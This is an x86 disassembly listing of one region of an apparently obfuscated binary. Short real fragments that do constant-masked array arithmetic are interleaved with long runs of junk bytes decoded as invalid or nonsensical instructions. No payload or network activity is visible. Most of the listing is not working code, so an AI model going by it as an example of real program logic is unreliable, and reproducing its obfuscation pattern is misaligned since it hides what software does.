  40d004:	sbb    DWORD PTR [eax+0x5c69fc6f],eax
  40d00a:	icebp  
  40d00b:	and    esi,DWORD PTR [esi+0x37463bcd]
  40d011:	push   cs
  40d012:	and    BYTE PTR [eax],bl
  40d014:	pop    ebp
  40d015:	cmp    al,0xff
  40d017:	add    ebp,DWORD PTR [ebx]
  40d019:	xor    ebp,DWORD PTR ds:0x31411f30
  40d01f:	retf   0x5361
  40d022:	xor    DWORD PTR es:[ebx-0x5cac8099],ecx
  40d029:	pop    ecx
  40d02a:	popa   
  40d02b:	pop    edi
  40d02c:	std    
  40d02d:	mov    cl,0x73
  40d02f:	addr16 jne 0x40cfed
  40d032:	shl    esp,0xc0
  40d035:	xchg   DWORD PTR [esi],edi
  40d037:	jno    0x40d009
  40d039:	jb     0x40d0b7
  40d03b:	sbb    al,0x6e
  40d03d:	sub    edi,esi
  40d03f:	nop
  40d040:	out    dx,al
  40d041:	in     eax,dx
  40d042:	and    BYTE PTR [eax+0xa486aca],0x47
  40d049:	push   0x79
  40d04b:	dec    esi
  40d04c:	mov    ecx,0x11303a03
  40d051:	in     al,dx
  40d052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d053:	loopne 0x40d0a2
  40d055:	aaa    
  40d056:	call   0xe5bf:0x94605bf3
  40d05d:	mov    al,ds:0xdc31b305
  40d062:	mov    ch,0xe0
  40d064:	addr16 out 0x3d,al
  40d067:	test   ecx,ebp
  40d069:	dec    ebp
  40d06a:	rcr    ebx,0x49
  40d06d:	mov    ebx,0x98310f92
  40d072:	push   cs
  40d073:	and    eax,0x54bb7c05
  40d078:	ss mov dh,0xcc
  40d07b:	inc    edx
  40d07c:	dec    esi
  40d07d:	rcl    BYTE PTR [edx],cl
  40d07f:	push   edi
  40d080:	mov    WORD PTR [ecx+0x25],gs
  40d083:	or     DWORD PTR [ebp+0x7fff39c0],0x4800519d
  40d08d:	dec    edi
  40d08e:	xchg   ecx,eax
  40d08f:	sub    DWORD PTR ds:0x197e5430,ebp
  40d095:	sub    eax,0x2e9ebd85
  40d09a:	(bad)  
  40d09b:	call   0x26b64ff5
  40d0a0:	and    eax,0xb236263e
  40d0a5:	loopne 0x40d0a4
  40d0a7:	(bad)  [esi-0x40]
  40d0aa:	loopne 0x40d0c7
  40d0ac:	xchg   edx,eax
  40d0ad:	mov    eax,DWORD PTR ds:[ebp+0xa87ece3]
  40d0b4:	push   esp
  40d0b5:	pop    ebp
  40d0b6:	ja     0x40d0c9
  40d0b8:	ret    0x5121
  40d0bb:	mov    al,ds:0xe6c731e
  40d0c0:	test   eax,0x1505ec89
  40d0c5:	or     edx,DWORD PTR [edx-0x29]
  40d0c8:	sub    DWORD PTR [edx+0x64818df4],esp
  40d0ce:	and    BYTE PTR [ecx-0x2cec1d97],al
  40d0d4:	cdq    
  40d0d5:	out    dx,al
  40d0d6:	xor    esp,DWORD PTR [edx]
  40d0d8:	adc    dl,BYTE PTR [edi+0x72]
  40d0db:	sbb    eax,0xdaf13c8f
  40d0e0:	pushf  
  40d0e1:	pop    edx
  40d0e2:	(bad)  
  40d0e4:	pop    edi
  40d0e5:	dec    edx
  40d0e6:	sahf   
  40d0e7:	xor    edi,esp
  40d0e9:	das    
  40d0ea:	inc    ebx
  40d0eb:	rcl    DWORD PTR [ebx],cl
  40d0ed:	push   0xffffffd9
  40d0ef:	int3   
  40d0f0:	inc    esp
  40d0f1:	xlat   BYTE PTR ds:[ebx]
  40d0f2:	mov    ebx,0x8669c094
  40d0f7:	sub    ebx,DWORD PTR [edx+esi*2]
  40d0fa:	jmp    0x14ca:0x3440dc86
  40d101:	in     al,dx
  40d102:	js     0x40d182
  40d104:	cmp    DWORD PTR [eax],edi
  40d106:	mov    fs,WORD PTR [ebx+0x3c]
  40d109:	adc    eax,0x984c485a
  40d10e:	cs aas 
  40d110:	xor    al,0x4b
  40d112:	and    BYTE PTR [eax],cl
  40d114:	xor    DWORD PTR [ebx],0xffffffd1
  40d117:	mov    ecx,DWORD PTR [ebp+0x8]
  40d11a:	lea    ecx,[edx+ecx*1+0x32729d]
  40d121:	cmp    ecx,eax
  40d123:	je     0x40d712
  40d129:	mov    edi,DWORD PTR [ebp-0x18]
  40d12c:	mov    eax,DWORD PTR [ebp+0x8]
  40d12f:	mov    edx,DWORD PTR [ebp+0x14]
  40d132:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d136:	mov    ecx,0x7510856
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	or     bh,0xa8
  40d160:	(bad)  
  40d161:	in     eax,0xd
  40d163:	mov    edi,DWORD PTR [esi+0x7e]
  40d166:	aas    
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d15e
  40d16b:	fisub  DWORD PTR [ecx+ecx*4-0x4c3615c1]
  40d172:	popa   
  40d173:	popa   
  40d174:	loopne 0x40d1ef
  40d176:	outs   dx,BYTE PTR ds:[esi]
  40d177:	outs   dx,BYTE PTR ds:[esi]
  40d178:	xchg   edi,eax
  40d179:	adc    ah,bh
  40d17b:	(bad)  
  40d17c:	cdq    
  40d17d:	leave  
  40d17e:	xchg   esp,eax
  40d17f:	ds pop ebp
  40d181:	cwde   
  40d182:	xor    eax,0xf6c21d75
  40d187:	xchg   edx,eax
  40d188:	sub    al,0x8c
  40d18a:	outs   dx,BYTE PTR ds:[esi]
  40d18b:	sbb    DWORD PTR [ecx+edx*2+0x49],0xfffffffe
  40d190:	(bad)  
  40d191:	push   esp
  40d192:	mov    al,0xe1
  40d194:	call   0x7b7a499c
  40d199:	adc    al,0xeb
  40d19b:	pop    edi
  40d19c:	xchg   ebp,eax
  40d19d:	sbb    al,0xb9
  40d19f:	in     eax,0x77
  40d1a1:	cmp    ah,BYTE PTR [edx-0x5a482c26]
  40d1a7:	loope  0x40d19d
  40d1a9:	cmp    bl,BYTE PTR [edx]
  40d1ab:	push   0x525d9a8d
  40d1b0:	scas   eax,DWORD PTR es:[edi]
  40d1b1:	aas    
  40d1b2:	lock inc edx
  40d1b4:	lods   eax,DWORD PTR ds:[esi]
  40d1b5:	mov    al,0xfb
  40d1b7:	xor    DWORD PTR ds:0x504609a3,esp
  40d1bd:	ret    0x73aa
  40d1c0:	cmp    bh,cl
  40d1c2:	test   DWORD PTR [edi],ecx
  40d1c4:	test   eax,0xcf11c19a
  40d1c9:	shl    DWORD PTR ds:0x291a2db,1
  40d1cf:	scas   al,BYTE PTR es:[edi]
  40d1d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1d1:	sub    edx,ebx
  40d1d3:	xor    bl,dh
  40d1d5:	xor    esp,edi
  40d1d7:	push   ebx
  40d1d8:	hlt    
  40d1d9:	fwait
  40d1da:	dec    ebp
  40d1db:	dec    ebp
  40d1dc:	push   esp
  40d1dd:	xor    BYTE PTR [eax+0x46d51eef],bl
  40d1e3:	and    BYTE PTR [eax],0xba
  40d1e6:	pop    edx
  40d1e7:	sub    eax,0xca33638f
  40d1ec:	test   al,0x39
  40d1ee:	sbb    DWORD PTR [edx+0x3e25bf47],esp
  40d1f4:	and    ecx,ebx
  40d1f6:	shl    BYTE PTR [esi],0x5f
  40d1f9:	jae    0x40d193
  40d1fb:	add    DWORD PTR [ebp+0x56],eax
  40d1fe:	not    edx
  40d200:	xchg   bh,dh
  40d202:	inc    esi
  40d203:	sbb    al,0x6f
  40d205:	sahf   
  40d206:	repnz cmp al,0x9
  40d209:	and    ch,0xa5
  40d20c:	dec    edi
  40d20d:	mov    ecx,0xcbfd1827
  40d212:	add    DWORD PTR [eax],0xad1fe37f
  40d218:	cmp    al,0xc
  40d21a:	push   esi
  40d21b:	call   0x5c0c4887
  40d220:	xchg   edi,eax
  40d221:	add    ecx,esp
  40d223:	(bad)  
  40d224:	or     BYTE PTR [eax+0x57],al
  40d227:	mov    ebx,0xec576f62
  40d22c:	std    
  40d22d:	ret    
  40d22e:	add    BYTE PTR [eax],0x3f
  40d231:	xor    eax,0x9005689d
  40d236:	lods   al,BYTE PTR ds:[esi]
  40d237:	mov    ah,0x11
  40d239:	and    cl,BYTE PTR [eax-0xf]
  40d23c:	js     0x40d223
  40d23e:	dec    ebx
  40d23f:	mov    cl,0x94
  40d241:	cs ds (bad) 
  40d244:	fdivr  QWORD PTR [ebp+0x67]
  40d247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d248:	mov    ebx,DWORD PTR [bp+di]
  40d24b:	adc    al,dl
  40d24d:	jne    0x40d243
  40d24f:	add    al,0x76
  40d251:	sbb    DWORD PTR [edi],ecx
  40d253:	out    dx,eax
  40d254:	in     eax,0xc
  40d256:	bound  ebx,QWORD PTR [eax-0xfcc60cd]
  40d25c:	in     eax,dx
  40d25d:	sahf   
  40d25e:	mov    ds:0x35f14f51,al
  40d263:	inc    edi
  40d264:	(bad)  [ebx+0x7b]
  40d267:	stos   BYTE PTR es:[edi],al
  40d268:	out    dx,al
  40d269:	push   ecx
  40d26a:	adc    BYTE PTR [esi],al
  40d26c:	sahf   
  40d26d:	jmp    DWORD PTR [ebp-0x2909975f]
  40d273:	mov    esi,0xcd65c596
  40d278:	mov    ch,0xb4
  40d27a:	das    
  40d27b:	ret    
  40d27c:	mov    cs,WORD PTR [ecx+0x20]
  40d27f:	pop    edx
  40d280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d281:	add    DWORD PTR [esi],edi
  40d283:	stos   BYTE PTR es:[edi],al
  40d284:	test   al,0x4c
  40d286:	pop    eax
  40d287:	xchg   esp,eax
  40d288:	and    esp,DWORD PTR [ebp-0x650a35bb]
  40d28e:	aas    
  40d28f:	dec    ecx
  40d290:	add    BYTE PTR [bx+di],bh
  40d293:	dec    esi
  40d294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d295:	jecxz  0x40d2fa
  40d297:	es xchg ecx,eax
  40d299:	jecxz  0x40d221
  40d29b:	aam    0xeb
  40d29d:	into   
  40d29e:	fwait
  40d29f:	jo     0x40d2f0
  40d2a1:	jmp    0xf4b5:0xf9f54652
  40d2a8:	add    edx,DWORD PTR [ebx+0x45]
  40d2ab:	lea    eax,[edx+eax*1+0x32729d]
  40d2b2:	mov    edx,DWORD PTR [ebp+0x8]
  40d2b5:	mov    edi,DWORD PTR [ebp-0x24]
  40d2b8:	mov    DWORD PTR [edi+edx*4],eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	mov    eax,0xce2d46f0
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d28a
  40d2ee:	mov    ebp,0xb6b974eb
  40d2f3:	es das 
  40d2f5:	iret   
  40d2f6:	mov    BYTE PTR [ecx],dh
  40d2f8:	hlt    
  40d2f9:	shr    BYTE PTR [ebx+0xf13aabc],cl
  40d2ff:	or     ecx,DWORD PTR [eax-0x51]
  40d302:	sub    edx,edx
  40d304:	call   0x5c59:0xda878480
  40d30b:	sti    
  40d30c:	jle    0x40d30c
  40d30e:	ror    ah,1
  40d310:	je     0x40d299
  40d312:	dec    edx
  40d313:	cmp    DWORD PTR [esi+ebx*1-0x6069ca33],0x64
  40d31b:	push   ebx
  40d31c:	fwait
  40d31d:	ror    dl,1
  40d31f:	fdivp  st(3),st
  40d321:	dec    edi
  40d322:	jo     0x40d336
  40d324:	jae    0x40d348
  40d326:	pop    es
  40d327:	lock hlt 
  40d329:	into   
  40d32a:	push   edx
  40d32b:	fcom   st(2)
  40d32d:	icebp  
  40d32e:	pop    ds
  40d32f:	sbb    eax,0x102490d0
  40d334:	xor    eax,0xe3b99cd
  40d339:	dec    edi
  40d33a:	adc    bh,bl
  40d33c:	adc    al,BYTE PTR [ebx]
  40d33e:	fwait
  40d33f:	jbe    0x40d335
  40d341:	test   eax,eax
  40d343:	repnz in eax,0xa7
  40d346:	pushf  
  40d347:	mov    ebp,0x2aec9f1b
  40d34c:	adc    al,0x6e
  40d34e:	(bad)  
  40d34f:	gs js  0x40d305
  40d352:	mov    ebx,0x4dd655db
  40d357:	add    BYTE PTR gs:[edi-0x5289b118],bl
  40d35e:	test   eax,0x99b6a166
  40d363:	ret    
  40d364:	dec    edx
  40d365:	inc    edi
  40d366:	imul   ecx,DWORD PTR [ebx],0x7c
  40d369:	retf   0xe10
  40d36c:	mov    edi,0x148f89a3
  40d371:	fld    TBYTE PTR [esi-0x1e2fdf39]
  40d377:	addr16 pop ecx
  40d379:	add    ebx,esi
  40d37b:	(bad)  
  40d37c:	xchg   ecx,eax
  40d37d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d37e:	ret    
  40d37f:	fs mov ch,0xf5
  40d382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d383:	daa    
  40d384:	push   esp
  40d385:	dec    edi
  40d386:	out    0xbf,eax
  40d388:	mov    DWORD PTR ds:0x3a4e794,ecx
  40d38e:	fwait
  40d38f:	inc    ecx
  40d390:	ins    BYTE PTR es:[edi],dx
  40d391:	fstp   DWORD PTR [edi-0xc2b71a5]
  40d397:	sar    esi,cl
  40d399:	or     al,0xfc
  40d39b:	stos   BYTE PTR es:[edi],al
  40d39c:	nop
  40d39d:	ins    DWORD PTR es:[edi],dx
  40d39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d39f:	cs or  al,0x6e
  40d3a2:	sahf   
  40d3a3:	aam    0x6d
  40d3a5:	cmp    BYTE PTR [ebx+0x665d9a0d],al
  40d3ab:	adc    DWORD PTR [ebx-0x1ff52dfa],esp
  40d3b1:	add    al,0xbe
  40d3b3:	(bad)  
  40d3b4:	jg     0x40d35e
  40d3b6:	rol    DWORD PTR [eax],0x52
  40d3b9:	inc    ebx
  40d3ba:	cli    
  40d3bb:	stc    
  40d3bc:	mov    eax,0xc99f3d88
  40d3c1:	(bad)  
  40d3c2:	ret    0x3d2b
  40d3c5:	push   ecx
  40d3c6:	and    DWORD PTR [edi],edx
  40d3c8:	cwde   
  40d3c9:	fadd   st,st(2)
  40d3cb:	add    dh,BYTE PTR [di-0x72ce]
  40d3d0:	pop    ebx
  40d3d1:	sbb    bh,bh
  40d3d3:	mov    edx,DWORD PTR [ebx-0x28ac6f35]
  40d3d9:	or     ecx,ebx
  40d3db:	adc    BYTE PTR [eax],dl
  40d3dd:	or     DWORD PTR [eax],ebp
  40d3df:	pop    esi
  40d3e0:	cmp    BYTE PTR [edx+0x7a357d4c],bh
  40d3e6:	mul    DWORD PTR [esi+eiz*8+0x5a]
  40d3ea:	fmul   DWORD PTR [eax+0x52]
  40d3ed:	xchg   ecx,eax
  40d3ee:	lock jg 0x40d40b
  40d3f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3f2:	sub    ecx,DWORD PTR [edx+edi*8]
  40d3f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3f6:	push   0x445ff525
  40d3fb:	int3   
  40d3fc:	dec    edi
  40d3fd:	mov    bl,0x6d
  40d3ff:	sub    al,0xa8
  40d401:	jnp    0x40d405
  40d403:	jnp    0x40d430
  40d405:	jmp    0x950cb3ae
  40d40a:	scas   eax,DWORD PTR es:[edi]
  40d40b:	cmp    BYTE PTR [edx-0xd],al
  40d40e:	inc    ebx
  40d40f:	mov    eax,0x94fff091
  40d414:	fwait
  40d415:	cwde   
  40d416:	mov    eax,es
  40d418:	cmp    bh,BYTE PTR [ecx+0x5c4fc2fa]
  40d41e:	test   al,0xf3
  40d421:	int    0x8f
  40d423:	or     cl,bh
  40d425:	cmp    ch,BYTE PTR [ebx+ebp*1-0x65]
  40d429:	sub    DWORD PTR [esi+0x6e],0xffffffd0
  40d42d:	and    eax,0x3314558b
  40d432:	rol    DWORD PTR [ebx],0xc6
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	xor    DWORD PTR [edx+eax*4+0x1f],0x7e7e8d8f
  40d451:	aas    
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d3e0
  40d456:	ins    BYTE PTR es:[edi],dx
  40d457:	xor    BYTE PTR [ecx+0x6],0x77
  40d45b:	adc    DWORD PTR [edx],ecx
  40d45d:	inc    esi
  40d45e:	pop    ds
  40d45f:	xor    DWORD PTR [edi+edx*1+0xcbc6e0e],edx
  40d466:	vmaxps xmm3,xmm1,XMMWORD PTR [ebx+0x1f]
  40d46b:	mov    ch,0x7f
  40d46d:	xchg   esp,eax
  40d46e:	cli    
  40d46f:	pop    edx
  40d470:	push   cs
  40d471:	(bad)  
  40d472:	jno    0x40d451
  40d474:	arpl   WORD PTR [eax],dx
  40d476:	in     eax,0xd1
  40d478:	dec    edi
  40d479:	clc    
  40d47a:	ror    edx,cl
  40d47c:	sbb    BYTE PTR [ecx+0x67d01826],al
  40d482:	xor    dl,BYTE PTR [ebx-0x6d]
  40d485:	ja     0x40d416
  40d487:	adc    DWORD PTR [eax*8+0x77462fd3],ebx
  40d48e:	nop
  40d48f:	xchg   ebx,eax
  40d490:	dec    esp
  40d491:	cmp    ebx,edx
  40d493:	inc    esp
  40d494:	adc    BYTE PTR ds:0x36a24c4f,bl
  40d49a:	dec    esi
  40d49b:	mov    dl,0x8e
  40d49d:	stos   BYTE PTR es:[edi],al
  40d49e:	sbb    dl,BYTE PTR [eax+0x508eb582]
  40d4a4:	mov    ds:0xae10ed8c,al
  40d4a9:	mov    DWORD PTR [edx],esp
  40d4ab:	add    bh,BYTE PTR [edi]
  40d4ad:	dec    esp
  40d4ae:	icebp  
  40d4af:	jo     0x40d4e8
  40d4b1:	push   ds
  40d4b2:	arpl   WORD PTR [edi],cx
  40d4b4:	iret   
  40d4b5:	inc    esi
  40d4b6:	ins    DWORD PTR es:[edi],dx
  40d4b7:	xchg   ebp,eax
  40d4b8:	or     cl,BYTE PTR [edi]
  40d4ba:	cmc    
  40d4bb:	sbb    esi,edi
  40d4bd:	scas   eax,DWORD PTR es:[edi]
  40d4be:	dec    ebx
  40d4bf:	int3   
  40d4c0:	out    0x1b,al
  40d4c2:	in     al,dx
  40d4c3:	leave  
  40d4c4:	adc    DWORD PTR [ecx-0x48],edx
  40d4c7:	pusha  
  40d4c8:	push   0x5
  40d4ca:	xor    BYTE PTR [esi],0xef
  40d4cd:	pop    ss
  40d4ce:	mov    edi,edi
  40d4d0:	stc    
  40d4d1:	and    eax,0xd1f8a40a
  40d4d6:	cmp    BYTE PTR [edx-0x4e],ch
  40d4d9:	fbstp  TBYTE PTR [ebx+0x18fa768c]
  40d4df:	in     al,0x5b
  40d4e1:	add    BYTE PTR [esi-0x10],bh
  40d4e4:	ja     0x40d471
  40d4e6:	ret    
  40d4e7:	dec    ecx
  40d4e8:	or     DWORD PTR [edx+0x30],0x40a7fcd6
  40d4ef:	add    eax,0x6ed5c0e0
  40d4f4:	xchg   DWORD PTR [esi],ebp
  40d4f6:	mov    edi,0xe0a8d82f
  40d4fb:	fsub   DWORD PTR [esi]
  40d4fd:	sbb    eax,0x2c4b793b
  40d502:	(bad)  
  40d503:	or     ebx,DWORD PTR [ebx-0x4c]
  40d506:	jge    0x40d557
  40d508:	scas   al,BYTE PTR es:[edi]
  40d509:	pop    ebp
  40d50a:	int    0x30
  40d50c:	add    DWORD PTR [eax],ebp
  40d50e:	xchg   edx,eax
  40d50f:	mov    fs,WORD PTR [esi]
  40d511:	inc    esp
  40d512:	dec    ebp
  40d513:	sub    ebp,DWORD PTR [ecx+edx*1-0x3f]
  40d517:	stos   DWORD PTR es:[edi],eax
  40d518:	adc    bl,ch
  40d51a:	lds    eax,FWORD PTR [esi-0x5b594270]
  40d520:	lds    edi,FWORD PTR [edi-0x5a5bc6de]
  40d526:	adc    eax,DWORD PTR [ebx-0x7e05184c]
  40d52c:	sbb    cl,BYTE PTR [edi-0x33a2f2be]
  40d532:	jmp    0x9269d8c6
  40d537:	popf   
  40d538:	jmp    0x6901d1c4
  40d53d:	icebp  
  40d53e:	(bad)  
  40d53f:	outs   dx,BYTE PTR ds:[esi]
  40d540:	xor    al,0xc4
  40d542:	sub    al,0x28
  40d544:	sub    al,BYTE PTR [esi-0x10ba4d4e]
  40d54a:	pushf  
  40d54b:	ffreep st(1)
  40d54d:	mov    ebp,DWORD PTR [esi+ebx*4-0x31af85b]
  40d554:	lock add ebp,DWORD PTR gs:[edi-0x1afe54d]
  40d55c:	and    DWORD PTR [ebx+ebp*8-0x7e],ebx
  40d560:	mov    al,ds:0xa7855fa6
  40d565:	lea    eax,[ebx]
  40d567:	sub    al,0xc6
  40d569:	loopne 0x40d55e
  40d56b:	adc    BYTE PTR [ebx],al
  40d56d:	aad    0x3b
  40d56f:	fdivr  QWORD PTR [eax+ebx*4-0x3]
  40d573:	in     eax,dx
  40d574:	dec    ebp
  40d575:	aad    0xc0
  40d577:	scas   al,BYTE PTR es:[edi]
  40d578:	adc    al,0xc7
  40d57a:	stos   BYTE PTR es:[edi],al
  40d57b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d57c:	jne    0x40d525
  40d57e:	mov    edx,0xde89c682
  40d583:	sti    
  40d584:	push   ds
  40d585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d586:	ds dec esi
  40d588:	pop    esp
  40d589:	mov    al,ds:0x3db5a81
  40d58e:	loope  0x40d5a0
  40d590:	add    DWORD PTR [esi],0x88533758
  40d596:	mov    edx,DWORD PTR [ebp-0x4]
  40d599:	jmp    0x40d6f7
  40d59e:	out    0xf7,eax
  40d5a0:	cmp    dl,BYTE PTR [esi]
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0x6454fe4c
  40d5ac:	and    dl,BYTE PTR [edx+0x40]
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d5aa
  40d5b7:	cwde   
  40d5b8:	call   0xafe6:0x4dc9c7d1
  40d5bf:	je     0x40d63d
  40d5c1:	adc    eax,0x4247df6b
  40d5c6:	pop    eax
  40d5c7:	xchg   ebp,eax
  40d5c8:	ret    0x9796
  40d5cb:	scas   eax,DWORD PTR es:[edi]
  40d5cc:	inc    ebp
  40d5cd:	jne    0x40d60c
  40d5cf:	jnp    0x40d60c
  40d5d1:	mov    ds:0xec0e1c06,eax
  40d5d6:	sbb    eax,0x931947a8
  40d5db:	jmp    0xa7f4:0x709d0771
  40d5e2:	jb     0x40d662
  40d5e4:	(bad)  
  40d5e5:	into   
  40d5e6:	jo     0x40d5bd
  40d5e8:	and    edx,esp
  40d5ea:	push   ecx
  40d5eb:	jle    0x40d612
  40d5ed:	lahf   
  40d5ee:	hlt    
  40d5ef:	sub    DWORD PTR [ebx+0x25c65fe8],ebx
  40d5f5:	scas   eax,DWORD PTR es:[edi]
  40d5f6:	jne    0x40d5c8
  40d5f8:	(bad)  
  40d5f9:	adc    edi,DWORD PTR [eax-0x26465412]
  40d5ff:	pop    eax
  40d600:	xchg   edx,esp
  40d602:	popf   
  40d603:	adc    eax,0x303f3b17
  40d608:	ins    BYTE PTR es:[edi],dx
  40d609:	push   ds
  40d60a:	push   cs
  40d60b:	inc    esp
  40d60c:	and    edi,DWORD PTR [esi+0x7805a0cc]
  40d612:	call   0x3b18:0x19ebd941
  40d619:	(bad)  
  40d61a:	sbb    al,0x31
  40d61c:	ss push esi
  40d61e:	cs daa 
  40d620:	dec    edx
  40d621:	rcr    eax,0x83
  40d624:	push   ebp
  40d625:	cmp    ebp,esp
  40d627:	das    
  40d628:	daa    
  40d629:	mov    DWORD PTR cs:[ecx+0x27653afe],esi
  40d630:	sbb    al,0x7b
  40d632:	sar    BYTE PTR [ebx-0x64],0xd
  40d636:	mov    esp,0xac02ae00
  40d63b:	pop    es
  40d63c:	sbb    DWORD PTR [edi],eax
  40d63e:	push   esp
  40d63f:	call   FWORD PTR [edi+0x5f]
  40d642:	push   edx
  40d643:	inc    esi
  40d644:	jge    0x40d64f
  40d646:	bnd jl 0x40d680
  40d649:	(bad)  
  40d64a:	or     esi,DWORD PTR [edx+edx*2]
  40d64d:	sbb    BYTE PTR [eax-0x56],al
  40d650:	pop    ebx
  40d651:	jg     0x40d634
  40d653:	sub    DWORD PTR [esi-0x260b512d],edx
  40d659:	icebp  
  40d65a:	test   al,0x3
  40d65c:	xor    cl,ah
  40d65e:	fstp   DWORD PTR [ebx+eiz*2-0x4]
  40d662:	test   al,0x17
  40d664:	mov    al,ds:0x1a0591af
  40d669:	xchg   edx,eax
  40d66a:	imul   edi,esi,0x27ead00d
  40d670:	inc    esi
  40d671:	imul   DWORD PTR [esi+0x15]
  40d674:	enter  0x3083,0xa0
  40d678:	adc    DWORD PTR [ebx*8-0x420e5bb8],ebx
  40d67f:	xchg   edi,eax
  40d680:	daa    
  40d681:	hlt    
  40d682:	pop    es
  40d683:	xchg   DWORD PTR [ecx+0x32ef97ec],ecx
  40d689:	mov    BYTE PTR [eax-0x2d],dl
  40d68c:	out    0x71,al
  40d68e:	lods   eax,DWORD PTR ds:[esi]
  40d68f:	or     edi,edx
  40d691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d692:	jge    0x40d6e4
  40d694:	add    eax,0xb33c5198
  40d699:	scas   eax,DWORD PTR es:[edi]
  40d69a:	cmp    esp,DWORD PTR [eax-0x27]
  40d69d:	shl    ch,0xd9
  40d6a0:	pop    ecx
  40d6a1:	cmovns ebx,DWORD PTR [edi-0x64]
  40d6a5:	dec    esi
  40d6a6:	mov    eax,ds:0x8fb118d1
  40d6ab:	shl    DWORD PTR [edx+0x44e4a7fb],0xa3
  40d6b2:	cmp    ch,BYTE PTR [edx-0x27f4578]
  40d6b8:	jns    0x40d670
  40d6ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6bb:	addr16 xchg esi,eax
  40d6bd:	mov    ebp,0x8223a325
  40d6c2:	aad    0x99
  40d6c4:	jnp    0x40d6c4
  40d6c6:	retf   
  40d6c7:	push   0xc0bb25f6
  40d6cc:	xchg   ebp,eax
  40d6cd:	add    dl,BYTE PTR [ecx-0x8]
  40d6d0:	stos   DWORD PTR es:[edi],eax
  40d6d1:	(bad)  
  40d6d3:	inc    ebx
  40d6d4:	pop    edx
  40d6d5:	xlat   BYTE PTR ds:[ebx]
  40d6d6:	sbb    al,BYTE PTR [ebp+eax*4+0x357cbafd]
  40d6dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6de:	idiv   dh
  40d6e0:	call   0x5798:0xeeca84b2
  40d6e7:	or     al,dl
  40d6e9:	push   esp
  40d6ea:	scas   eax,DWORD PTR es:[edi]
  40d6eb:	cmp    eax,0x578eacee
  40d6f0:	clc    
  40d6f1:	push   0x3c7263ce
  40d6f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6f7:	xor    edx,ecx
  40d6f9:	mov    ecx,DWORD PTR [ebp+0x8]
  40d6fc:	lea    ecx,[edx+ecx*1+0x32729d]
  40d703:	cmp    ecx,eax
  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	or     eax,0x1f18137
  40d741:	cmp    BYTE PTR [esi+0x7e],0x3f
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d73d
  40d749:	(bad)  
  40d74a:	loop   0x40d6db
  40d74c:	inc    ebx
  40d74d:	cmp    cl,BYTE PTR [esi+edx*8+0x458f22d6]
  40d754:	push   esp
  40d755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d756:	iret   
  40d757:	icebp  
  40d758:	fsubr  DWORD PTR [ebx-0x3ad0f8d4]
  40d75e:	dec    esp
  40d75f:	aad    0x13
  40d761:	(bad)  
  40d762:	repnz cmc 
  40d764:	mov    ebx,0xcee0f018
  40d769:	mov    eax,ss
  40d76b:	out    dx,al
  40d76c:	out    dx,eax
  40d76d:	ss dec esp
  40d76f:	sub    eax,0xcd0eac9
  40d774:	inc    edx
  40d775:	int3   
  40d776:	xchg   esi,eax
